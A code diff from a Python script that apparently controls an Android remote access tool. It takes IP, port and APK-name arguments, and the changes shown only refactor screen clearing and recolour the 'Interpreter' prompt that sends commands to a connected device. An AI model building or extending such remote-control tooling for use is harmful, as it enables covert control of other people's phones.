@@ -23,13 +23,8 @@ parser.add_argument('-i','--ip',metavar="<IP>" ,required=True,type=str,help='Ent
 parser.add_argument('-p','--port',metavar="<Port>", type=str,required=True,help='Enter the Port')
 parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter the apk Name')
 args = parser.parse_args()
-if(platform.system() == 'Windows'):
-    init(convert=True)
-    clear = lambda: os.system('cls')
-    direc = "\\"
-else:
-    clear = lambda: os.system('clear')
-    direc = "/"
+
+clear,direc = clearDirec()
 
 if is_valid_ip(args.ip):
     ip = args.ip
@@ -90,7 +85,7 @@ if args.shell:
                 help()
             else:
                 print(msg)
-            message_to_send = input(Style.BRIGHT+Fore.GREEN+"Interpreter:/> "+Fore.RESET)+"\n"
+            message_to_send = input(Style.BRIGHT+Fore.CYAN+"Interpreter:/> "+Fore.RESET)+"\n"
             conn.send(message_to_send.encode("UTF-8"))
             if message_to_send.strip() == "exit":
                 print(" ")
